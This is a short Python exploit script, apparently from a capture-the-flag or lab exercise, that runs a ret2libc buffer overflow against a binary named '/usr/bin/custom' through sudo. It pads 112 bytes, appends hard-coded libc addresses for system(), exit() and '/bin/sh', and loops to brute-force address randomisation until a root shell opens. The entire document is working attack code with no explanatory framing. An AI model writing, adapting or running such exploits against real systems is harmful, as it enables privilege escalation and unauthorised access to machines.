#!/usr/bin/python3 
import subprocess, sys 
from struct import pack 

# Global vars 

offset = 112

base_addr_libc = 0xb75b3000

# SYSTEM FUNC, EXIT FUNC, /bin/sh STRING ADDR OFFSET 

system_addr_off = 0x0003adb0 
exit_addr_off = 0x0002e9e0
bin_sh_addr_off = 0x0015bb2b

# REAL ADDR SYSTEM FUNC, EXIT FUNC, /bin/sh/ STRING ADDR: 

system_addr = pack("<L", base_addr_libc + system_addr_off) 
exit_addr = pack("<L", base_addr_libc + exit_addr_off)
bin_sh_addr = pack("<L", base_addr_libc + bin_sh_addr_off)


payload = b"A"*offset + system_addr + exit_addr + bin_sh_addr

# Buffer overflow exploit 

def main(): 
    while True: 
        bash = subprocess.run(["sudo", "/usr/bin/custom", payload ]) 
        
        if bash.returncode == 0: 
            print("\n\t[!] Quiting...\n\n")
            sys.exit(0)

if __name__ == "__main__": 
    main()
